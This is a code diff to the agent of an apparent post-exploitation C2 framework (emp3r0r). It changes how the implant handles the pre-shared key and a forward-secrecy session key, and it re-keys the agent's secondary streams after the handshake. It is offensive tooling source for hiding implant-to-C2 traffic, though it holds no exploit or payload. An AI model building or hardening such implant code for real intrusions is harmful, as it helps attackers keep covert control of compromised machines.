@@ -39,9 +39,11 @@ func ReportStatus(config *def.Config, info *def.Emp3r0rAgent) (err error) {
 	}
 	defer conn.Close()
 
-	// Global Encryption: Wrap connection with PSK
-	// Note: EstablishC2Connection already wraps with SecureConn before sending MsgAuth.
-	// Here we need a fresh SecureConn for the agent data payload that follows.
+	// Global Encryption: Wrap connection with the per-build PSK.
+	// Check-in is the bootstrap route: it always runs before the PFS handshake,
+	// so it is encrypted with def.AESPassword (never the ephemeral session key).
+	// EstablishC2Connection already sent the MsgAuth envelope over a SecureConn;
+	// NewSecureConn is idempotent and simply hands that same stream back.
 	secureConn := transport.NewSecureConn(conn)
 
 	out := cbor.NewEncoder(secureConn)
@@ -107,6 +109,9 @@ func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def
 	)
 	go catchInterruptAndExit(ctx, cancel)
 	defer func() {
+		// The session is over: never let the ephemeral PFS key leak into the
+		// reconnect/check-in phase (which must use the static per-build PSK).
+		clearCurrentSessionKey()
 		go func() {
 			defer func() {
 				if r := recover(); r != nil {
@@ -128,6 +133,11 @@ func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def
 		return fmt.Errorf("failed to generate ephemeral key pair: %v", err)
 	}
 	pubKeyBytes := transport.SerializePublicKey(&privKey.PublicKey)
+
+	// A fresh session starts on the per-build PSK. Whatever session key was
+	// left behind by a previous tunnel is stale — drop it now so the handshake
+	// below always starts from the static PSK.
+	clearCurrentSessionKey()
 
 	// check for CC server's response
 	go func() {
@@ -191,6 +201,9 @@ func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def
 				secureConn.SetKey(sessionKey)
 				logging.Successf("SecureConn: Switched to ephemeral session key (PFS enabled)")
 				pfsKeysExchanged = true
+				// Publish the PFS key: every subsequent agent↔C2 stream (FTP, WWW,
+				// proxy) that EstablishC2Connection opens is re-keyed to it.
+				setCurrentSessionKey(sessionKey)
 
 				// Notify wait_hello that handshake is done
 				if waiting {
